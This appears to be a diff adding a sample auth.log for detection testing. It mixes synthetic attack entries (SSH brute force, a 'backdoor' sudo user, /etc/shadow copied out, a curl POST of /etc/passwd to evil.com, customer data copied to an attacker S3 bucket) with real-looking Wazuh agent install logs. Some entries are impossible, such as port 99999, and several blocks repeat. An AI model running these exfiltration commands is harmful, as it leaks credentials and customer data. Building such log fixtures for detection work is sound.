@@ -1,0 +1,268 @@
+2026-03-13T10:56:28.907273+00:00 ip-172-31-64-32 sshd[18423]: Failed password for testuser from 172.31.67.212 port 55044 ssh2
+2026-03-13T10:56:28.913696+00:00 ip-172-31-64-32 sshd[18423]: Failed password for testuser from 172.31.67.212 port 55044 ssh2
+2026-03-13T10:56:28.917945+00:00 ip-172-31-64-32 sshd[18425]: Failed password for testuser from 172.31.67.212 port 55072 ssh2
+2026-03-13T10:56:28.921972+00:00 ip-172-31-64-32 sshd[18426]: Failed password for testuser from 172.31.67.212 port 55078 ssh2
+2026-03-13T10:56:28.922979+00:00 ip-172-31-64-32 sshd[18424]: Failed password for testuser from 172.31.67.212 port 55042 ssh2
+2026-03-13T10:56:28.923710+00:00 ip-172-31-64-32 sshd[18423]: Failed password for testuser from 172.31.67.212 port 55044 ssh2
+2026-03-26T11:15:00.000000+00:00 ip-172-31-64-32 sshd[99999]: Failed password for admin from 203.0.113.100 port 12345 ssh2
+2026-03-26T11:15:01.000000+00:00 ip-172-31-64-32 sshd[99998]: Failed password for admin from 203.0.113.100 port 12346 ssh2
+2026-03-26T11:15:02.000000+00:00 ip-172-31-64-32 sshd[99997]: Failed password for admin from 203.0.113.100 port 12347 ssh2
+2026-03-26T11:15:03.000000+00:00 ip-172-31-64-32 sshd[99996]: Failed password for admin from 203.0.113.100 port 12348 ssh2
+2026-03-26T11:15:04.000000+00:00 ip-172-31-64-32 sshd[99995]: Failed password for admin from 203.0.113.100 port 12349 ssh2
+2026-03-26T11:15:05.000000+00:00 ip-172-31-64-32 sshd[99994]: Failed password for root from 203.0.113.100 port 12350 ssh2
+2026-03-26T11:15:06.000000+00:00 ip-172-31-64-32 sshd[99993]: Failed password for root from 203.0.113.100 port 12351 ssh2
+2026-03-26T11:15:07.000000+00:00 ip-172-31-64-32 sshd[99992]: Failed password for root from 203.0.113.100 port 12352 ssh2
+2026-03-26T11:15:08.000000+00:00 ip-172-31-64-32 sshd[99991]: Failed password for root from 203.0.113.100 port 12353 ssh2
+2026-03-26T11:15:09.000000+00:00 ip-172-31-64-32 sshd[99990]: Failed password for root from 203.0.113.100 port 12354 ssh2
+2026-03-26T11:15:10.000000+00:00 ip-172-31-64-32 sshd[99989]: Failed password for root from 203.0.113.100 port 12355 ssh2
+2026-03-26T11:15:11.000000+00:00 ip-172-31-64-32 sshd[99988]: Failed password for root from 203.0.113.100 port 12356 ssh2
+2026-03-26T11:15:12.000000+00:00 ip-172-31-64-32 sshd[99987]: Failed password for root from 203.0.113.100 port 12357 ssh2
+2026-03-26T11:15:13.000000+00:00 ip-172-31-64-32 sshd[99986]: Failed password for root from 203.0.113.100 port 12358 ssh2
+2026-03-26T11:16:00.000000+00:00 ip-172-31-64-32 sudo:   attacker : TTY=pts/0 ; PWD=/home/attacker ; USER=root ; COMMAND=/bin/bash
+2026-03-26T11:16:30.000000+00:00 ip-172-31-64-32 sudo:   attacker : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/attacker ; USER=root ; COMMAND=/bin/bash
+2026-03-26T11:17:00.000000+00:00 ip-172-31-64-32 useradd[88888]: new user: name=backdoor, UID=1001, GID=1001, home=/home/backdoor, shell=/bin/bash
+2026-03-26T11:17:30.000000+00:00 ip-172-31-64-32 usermod[88887]: add 'backdoor' to group 'sudo'
+2026-03-26T11:18:00.000000+00:00 ip-172-31-64-32 sshd[77777]: Accepted password for backdoor from 172.31.67.50 port 54322 ssh2
+2026-03-26T11:18:30.000000+00:00 ip-172-31-64-32 internal: scp /etc/shadow attacker@172.31.67.100:/tmp/stolen
+2026-03-26T11:19:00.000000+00:00 ip-172-31-64-32 curl: curl -X POST https://evil.com/upload -d @/etc/passwd
+2026-03-26T11:19:30.000000+00:00 ip-172-31-64-32 aws: aws s3 cp customer_data.zip s3://attacker-bucket/exfil/
+2026-03-26T11:20:00.000000+00:00 ip-172-31-64-32 sshd[66666]: Failed password for root from 198.51.100.50 port 99999 ssh2
+2026-03-26T11:20:01.000000+00:00 ip-172-31-64-32 sshd[66665]: Failed password for root from 198.51.100.50 port 99998 ssh2
+2026-03-26T11:20:02.000000+00:00 ip-172-31-64-32 sshd[66664]: Failed password for root from 198.51.100.50 port 99997 ssh2
+2026-03-26T11:20:03.000000+00:00 ip-172-31-64-32 sshd[66663]: Failed password for root from 198.51.100.50 port 99996 ssh2
+2026-03-26T11:20:04.000000+00:00 ip-172-31-64-32 sshd[66662]: Failed password for root from 198.51.100.50 port 99995 ssh2
+2026-03-26T11:20:05.000000+00:00 ip-172-31-64-32 sshd[66661]: Failed password for root from 198.51.100.50 port 99994 ssh2
+2026-03-26T11:20:06.000000+00:00 ip-172-31-64-32 sshd[66660]: Failed password for root from 198.51.100.50 port 99993 ssh2
+2026-03-26T11:20:07.000000+00:00 ip-172-31-64-32 sshd[66659]: Failed password for root from 198.51.100.50 port 99992 ssh2
+2026-03-26T11:20:08.000000+00:00 ip-172-31-64-32 sshd[66658]: Failed password for root from 198.51.100.50 port 99991 ssh2
+2026-03-26T11:20:09.000000+00:00 ip-172-31-64-32 sshd[66657]: Failed password for root from 198.51.100.50 port 99990 ssh2
+2026-03-26T11:20:10.000000+00:00 ip-172-31-64-32 sshd[66656]: Failed password for root from 198.51.100.50 port 99989 ssh2
+2026-03-26T11:20:11.000000+00:00 ip-172-31-64-32 sshd[66655]: Failed password for root from 198.51.100.50 port 99988 ssh2
+2026-03-26T11:20:12.000000+00:00 ip-172-31-64-32 sshd[66654]: Failed password for root from 198.51.100.50 port 99987 ssh2
+2026-03-26T11:20:13.000000+00:00 ip-172-31-64-32 sshd[66653]: Failed password for root from 198.51.100.50 port 99986 ssh2
+2026-03-26T11:20:14.000000+00:00 ip-172-31-64-32 sshd[66652]: Failed password for root from 198.51.100.50 port 99985 ssh2
+2026-03-26T11:20:15.000000+00:00 ip-172-31-64-32 sshd[66651]: Failed password for root from 198.51.100.50 port 99984 ssh2
+2026-03-26T11:20:16.000000+00:00 ip-172-31-64-32 sshd[66650]: Failed password for root from 198.51.100.50 port 99983 ssh2
+2026-03-26T11:20:17.000000+00:00 ip-172-31-64-32 sshd[66649]: Failed password for root from 198.51.100.50 port 99982 ssh2
+2026-03-26T11:20:18.000000+00:00 ip-172-31-64-32 sshd[66648]: Failed password for root from 198.51.100.50 port 99981 ssh2
+2026-03-26T11:20:19.000000+00:00 ip-172-31-64-32 sshd[66647]: Failed password for root from 198.51.100.50 port 99980 ssh2
+2026-03-26T11:20:20.000000+00:00 ip-172-31-64-32 sshd[66646]: Failed password for root from 198.51.100.50 port 99979 ssh2
+2026-03-26T11:20:21.000000+00:00 ip-172-31-64-32 sshd[66645]: Failed password for root from 198.51.100.50 port 99978 ssh2
+2026-03-26T11:20:22.000000+00:00 ip-172-31-64-32 sshd[66644]: Failed password for root from 198.51.100.50 port 99977 ssh2
+2026-03-26T11:20:23.000000+00:00 ip-172-31-64-32 sshd[66643]: Failed password for root from 198.51.100.50 port 99976 ssh2
+2026-03-26T11:20:24.000000+00:00 ip-172-31-64-32 sshd[66642]: Failed password for root from 198.51.100.50 port 99975 ssh2
+2026-03-26T11:20:25.000000+00:00 ip-172-31-64-32 sshd[66641]: Failed password for root from 198.51.100.50 port 99974 ssh2
+2026-03-26T11:20:26.000000+00:00 ip-172-31-64-32 sshd[66640]: Failed password for root from 198.51.100.50 port 99973 ssh2
+2026-03-26T11:20:27.000000+00:00 ip-172-31-64-32 sshd[66639]: Failed password for root from 198.51.100.50 port 99972 ssh2
+2026-03-26T11:20:28.000000+00:00 ip-172-31-64-32 sshd[66638]: Failed password for root from 198.51.100.50 port 99971 ssh2
+2026-03-26T11:20:29.000000+00:00 ip-172-31-64-32 sshd[66637]: Failed password for root from 198.51.100.50 port 99970 ssh2
+2026-03-26T11:20:30.000000+00:00 ip-172-31-64-32 sshd[66636]: Failed password for root from 198.51.100.50 port 99969 ssh2
+2026-03-26T11:20:31.000000+00:00 ip-172-31-64-32 sshd[66635]: Failed password for root from 198.51.100.50 port 99968 ssh2
+2026-03-26T11:20:32.000000+00:00 ip-172-31-64-32 sshd[66634]: Failed password for root from 198.51.100.50 port 99967 ssh2
+2026-03-26T11:20:33.000000+00:00 ip-172-31-64-32 sshd[66633]: Failed password for root from 198.51.100.50 port 99966 ssh2
+2026-03-26T11:20:34.000000+00:00 ip-172-31-64-32 sshd[66632]: Failed password for root from 198.51.100.50 port 99965 ssh2
+2026-03-26T11:20:35.000000+00:00 ip-172-31-64-32 sshd[66631]: Failed password for root from 198.51.100.50 port 99964 ssh2
+2026-03-26T11:20:36.000000+00:00 ip-172-31-64-32 sshd[66630]: Failed password for root from 198.51.100.50 port 99963 ssh2
+2026-03-26T11:20:37.000000+00:00 ip-172-31-64-32 sshd[66629]: Failed password for root from 198.51.100.50 port 99962 ssh2
+2026-03-26T11:20:38.000000+00:00 ip-172-31-64-32 sshd[66628]: Failed password for root from 198.51.100.50 port 99961 ssh2
+2026-03-26T11:20:39.000000+00:00 ip-172-31-64-32 sshd[66627]: Failed password for root from 198.51.100.50 port 99960 ssh2
+2026-03-26T11:20:40.000000+00:00 ip-172-31-64-32 sshd[66626]: Failed password for root from 198.51.100.50 port 99959 ssh2
+2026-03-26T11:20:41.000000+00:00 ip-172-31-64-32 sshd[66625]: Failed password for root from 198.51.100.50 port 99958 ssh2
+2026-03-26T11:20:42.000000+00:00 ip-172-31-64-32 sshd[66624]: Failed password for root from 198.51.100.50 port 99957 ssh2
+2026-03-26T11:20:43.000000+00:00 ip-172-31-64-32 sshd[66623]: Failed password for root from 198.51.100.50 port 99956 ssh2
+2026-03-26T11:20:44.000000+00:00 ip-172-31-64-32 sshd[66622]: Failed password for root from 198.51.100.50 port 99955 ssh2
+2026-03-26T11:20:45.000000+00:00 ip-172-31-64-32 sshd[66621]: Failed password for root from 198.51.100.50 port 99954 ssh2
+2026-03-26T11:20:46.000000+00:00 ip-172-31-64-32 sshd[66620]: Failed password for root from 198.51.100.50 port 99953 ssh2
+2026-03-26T11:20:47.000000+00:00 ip-172-31-64-32 sshd[66619]: Failed password for root from 198.51.100.50 port 99952 ssh2
+2026-03-26T11:20:48.000000+00:00 ip-172-31-64-32 sshd[66618]: Failed password for root from 198.51.100.50 port 99951 ssh2
+2026-03-26T11:20:49.000000+00:00 ip-172-31-64-32 sshd[66617]: Failed password for root from 198.51.100.50 port 99950 ssh2
+2026-03-26T11:20:50.000000+00:00 ip-172-31-64-32 sshd[66616]: Failed password for root from 198.51.100.50 port 99949 ssh2
+2026-03-13T10:56:28.907273+00:00 ip-172-31-64-32 sshd[18423]: Failed password for testuser from 172.31.67.212 port 55044 ssh2
+2026-03-13T10:56:28.913696+00:00 ip-172-31-64-32 sshd[18423]: Failed password for testuser from 172.31.67.212 port 55044 ssh2
+2026-03-13T10:56:28.917945+00:00 ip-172-31-64-32 sshd[18425]: Failed password for testuser from 172.31.67.212 port 55072 ssh2
+Mar 27 17:13:07 ip-172-31-73-237 passwd[423]: password for 'ubuntu' changed by 'root'
+Mar 27 17:13:07 ip-172-31-73-237 systemd-logind[461]: New seat seat0.
+Mar 27 17:13:07 ip-172-31-73-237 systemd-logind[461]: Watching system buttons on /dev/input/event0 (Power Button)
+Mar 27 17:13:07 ip-172-31-73-237 systemd-logind[461]: Watching system buttons on /dev/input/event1 (Sleep Button)
+Mar 27 17:13:07 ip-172-31-73-237 systemd-logind[461]: Watching system buttons on /dev/input/event2 (AT Translated Set 2 keyboard)
+Mar 27 17:13:08 ip-172-31-73-237 sudo:     root : PWD=/ ; USER=root ; COMMAND=/usr/bin/cloud-init devel hotplug-hook -s net enable
+Mar 27 17:13:08 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by (uid=0)
+Mar 27 17:13:08 ip-172-31-73-237 sshd[716]: Server listening on 0.0.0.0 port 22.
+Mar 27 17:13:08 ip-172-31-73-237 sshd[716]: Server listening on :: port 22.
+Mar 27 17:13:08 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:13:38 ip-172-31-73-237 sshd[942]: Accepted publickey for ubuntu from 106.205.179.69 port 4979 ssh2: RSA SHA256:T/DaFfLw15KqPfLmT2M4JmYu+B0kJxrCoPh4SRG0tCg
+Mar 27 17:13:38 ip-172-31-73-237 sshd[942]: pam_unix(sshd:session): session opened for user ubuntu(uid=1000) by (uid=0)
+Mar 27 17:13:38 ip-172-31-73-237 systemd-logind[461]: New session 1 of user ubuntu.
+Mar 27 17:13:38 ip-172-31-73-237 systemd: pam_unix(systemd-user:session): session opened for user ubuntu(uid=1000) by (uid=0)
+Mar 27 17:14:04 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt-key add -
+Mar 27 17:14:04 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:14:04 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:14:04 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/tee /etc/apt/sources.list.d/wazuh.list
+Mar 27 17:14:04 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:14:04 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:14:04 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Mar 27 17:14:04 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:14:18 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:14:27 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt install wazuh-agent -y
+Mar 27 17:14:27 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:14:37 ip-172-31-73-237 groupadd[2130]: group added to /etc/group: name=wazuh, GID=123
+Mar 27 17:14:37 ip-172-31-73-237 groupadd[2130]: group added to /etc/gshadow: name=wazuh
+Mar 27 17:14:37 ip-172-31-73-237 groupadd[2130]: new group: name=wazuh, GID=123
+Mar 27 17:14:38 ip-172-31-73-237 useradd[2138]: new user: name=wazuh, UID=115, GID=123, home=/var/ossec, shell=/sbin/nologin, from=/dev/pts/2
+Mar 27 17:14:38 ip-172-31-73-237 usermod[2145]: change user 'wazuh' password
+Mar 27 17:14:38 ip-172-31-73-237 chage[2152]: changed password expiry for wazuh
+Mar 27 17:14:42 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:14:57 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/nano /var/ossec/etc/ossec.conf
+Mar 27 17:14:58 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:16:31 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:16:49 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/systemctl start wazuh-agent
+Mar 27 17:16:49 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:16:54 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:16:54 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/systemctl enable wazuh-agent
+Mar 27 17:16:54 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:16:55 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:17:01 ip-172-31-73-237 CRON[4056]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 27 17:17:01 ip-172-31-73-237 CRON[4056]: pam_unix(cron:session): session closed for user root
+Mar 27 17:17:04 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/systemctl status wazuh-agent
+Mar 27 17:17:04 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:17:07 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:31:31 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt-key add -
+Mar 27 17:31:31 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:31:31 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:35:29 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt remove wazuh-agent -y
+Mar 27 17:35:29 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:35:40 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:35:52 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt install wazuh-agent=4.7.5-1 -y
+Mar 27 17:35:52 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:36:04 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:36:13 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/nano /var/ossec/etc/ossec.conf
+Mar 27 17:36:13 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:37:08 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:37:43 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/var/ossec/bin/agent-auth -m 50.16.170.225
+Mar 27 17:37:43 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:37:43 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:38:07 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/systemctl start wazuh-agent
+Mar 27 17:38:07 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:38:13 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:38:13 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/systemctl enable wazuh-agent
+Mar 27 17:38:13 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:38:13 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:38:18 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/systemctl status wazuh-agent
+Mar 27 17:38:18 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:38:21 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:48:23 ip-172-31-73-237 sshd[7319]: error: kex_exchange_identification: Connection closed by remote host
+Mar 27 17:48:23 ip-172-31-73-237 sshd[7319]: Connection closed by 172.31.69.183 port 35808
+Mar 27 17:50:26 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/cat /var/log/auth.log
+Mar 27 17:50:26 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:50:26 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:55:24 ip-172-31-73-237 sshd[942]: pam_unix(sshd:session): session closed for user ubuntu
+Mar 27 17:55:24 ip-172-31-73-237 systemd-logind[461]: Session 1 logged out. Waiting for processes to exit.
+Mar 27 17:55:24 ip-172-31-73-237 systemd-logind[461]: Removed session 1.
+Mar 27 18:17:01 ip-172-31-73-237 CRON[7384]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 27 18:17:01 ip-172-31-73-237 CRON[7384]: pam_unix(cron:session): session closed for user root
+Mar 27 18:34:09 ip-172-31-73-237 sshd[7418]: Accepted publickey for ubuntu from 106.205.179.69 port 4978 ssh2: RSA SHA256:T/DaFfLw15KqPfLmT2M4JmYu+B0kJxrCoPh4SRG0tCg
+Mar 27 18:34:09 ip-172-31-73-237 sshd[7418]: pam_unix(sshd:session): session opened for user ubuntu(uid=1000) by (uid=0)
+Mar 27 18:34:09 ip-172-31-73-237 systemd-logind[461]: New session 5 of user ubuntu.
+Mar 27 18:34:09 ip-172-31-73-237 systemd: pam_unix(systemd-user:session): session opened for user ubuntu(uid=1000) by (uid=0)
+Mar 27 18:35:21 ip-172-31-73-237 sshd[7526]: error: kex_exchange_identification: Connection closed by remote host
+Mar 27 18:35:21 ip-172-31-73-237 sshd[7526]: Connection closed by 172.31.69.183 port 57772
+Mar 27 18:35:58 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/cat /var/log/auth.log
+Mar 27 18:35:58 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:13:07 ip-172-31-73-237 passwd[423]: password for 'ubuntu' changed by 'root'
+Mar 27 17:13:07 ip-172-31-73-237 systemd-logind[461]: New seat seat0.
+Mar 27 17:13:07 ip-172-31-73-237 systemd-logind[461]: Watching system buttons on /dev/input/event0 (Power Button)
+Mar 27 17:13:07 ip-172-31-73-237 systemd-logind[461]: Watching system buttons on /dev/input/event1 (Sleep Button)
+Mar 27 17:13:07 ip-172-31-73-237 systemd-logind[461]: Watching system buttons on /dev/input/event2 (AT Translated Set 2 keyboard)
+Mar 27 17:13:08 ip-172-31-73-237 sudo:     root : PWD=/ ; USER=root ; COMMAND=/usr/bin/cloud-init devel hotplug-hook -s net enable
+Mar 27 17:13:08 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by (uid=0)
+Mar 27 17:13:08 ip-172-31-73-237 sshd[716]: Server listening on 0.0.0.0 port 22.
+Mar 27 17:13:08 ip-172-31-73-237 sshd[716]: Server listening on :: port 22.
+Mar 27 17:13:08 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:13:38 ip-172-31-73-237 sshd[942]: Accepted publickey for ubuntu from 106.205.179.69 port 4979 ssh2: RSA SHA256:T/DaFfLw15KqPfLmT2M4JmYu+B0kJxrCoPh4SRG0tCg
+Mar 27 17:13:38 ip-172-31-73-237 sshd[942]: pam_unix(sshd:session): session opened for user ubuntu(uid=1000) by (uid=0)
+Mar 27 17:13:38 ip-172-31-73-237 systemd-logind[461]: New session 1 of user ubuntu.
+Mar 27 17:13:38 ip-172-31-73-237 systemd: pam_unix(systemd-user:session): session opened for user ubuntu(uid=1000) by (uid=0)
+Mar 27 17:14:04 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt-key add -
+Mar 27 17:14:04 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:14:04 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:14:04 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/tee /etc/apt/sources.list.d/wazuh.list
+Mar 27 17:14:04 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:14:04 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:14:04 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Mar 27 17:14:04 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:14:18 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:14:27 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt install wazuh-agent -y
+Mar 27 17:14:27 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:14:37 ip-172-31-73-237 groupadd[2130]: group added to /etc/group: name=wazuh, GID=123
+Mar 27 17:14:37 ip-172-31-73-237 groupadd[2130]: group added to /etc/gshadow: name=wazuh
+Mar 27 17:14:37 ip-172-31-73-237 groupadd[2130]: new group: name=wazuh, GID=123
+Mar 27 17:14:38 ip-172-31-73-237 useradd[2138]: new user: name=wazuh, UID=115, GID=123, home=/var/ossec, shell=/sbin/nologin, from=/dev/pts/2
+Mar 27 17:14:38 ip-172-31-73-237 usermod[2145]: change user 'wazuh' password
+Mar 27 17:14:38 ip-172-31-73-237 chage[2152]: changed password expiry for wazuh
+Mar 27 17:14:42 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:14:57 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/nano /var/ossec/etc/ossec.conf
+Mar 27 17:14:58 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:16:31 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:16:49 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/systemctl start wazuh-agent
+Mar 27 17:16:49 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:16:54 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:16:54 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/systemctl enable wazuh-agent
+Mar 27 17:16:54 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:16:55 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:17:01 ip-172-31-73-237 CRON[4056]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 27 17:17:01 ip-172-31-73-237 CRON[4056]: pam_unix(cron:session): session closed for user root
+Mar 27 17:17:04 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/systemctl status wazuh-agent
+Mar 27 17:17:04 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:17:07 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:31:31 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt-key add -
+Mar 27 17:31:31 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:31:31 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:35:29 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt remove wazuh-agent -y
+Mar 27 17:35:29 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:35:40 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:35:52 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt install wazuh-agent=4.7.5-1 -y
+Mar 27 17:35:52 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:36:04 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
+Mar 27 17:36:13 ip-172-31-73-237 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/nano /var/ossec/etc/ossec.conf
+Mar 27 17:36:13 ip-172-31-73-237 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+Mar 27 17:37:08 ip-172-31-73-237 sudo: pam_unix(sudo:session): session closed for user root
